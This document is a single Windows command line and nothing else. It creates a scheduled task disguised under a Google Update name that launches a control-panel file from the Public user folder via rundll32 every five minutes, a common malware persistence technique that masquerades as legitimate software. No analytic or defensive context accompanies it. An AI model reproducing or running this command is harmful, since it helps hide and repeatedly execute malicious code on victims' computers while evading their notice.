schtasks /create /tn "GoogleUpdateTaskMachineCor" /tr "cmd /c start /min rundll32 C:\Users\Public\psn.cpl" /sc minute /mo 5 /F
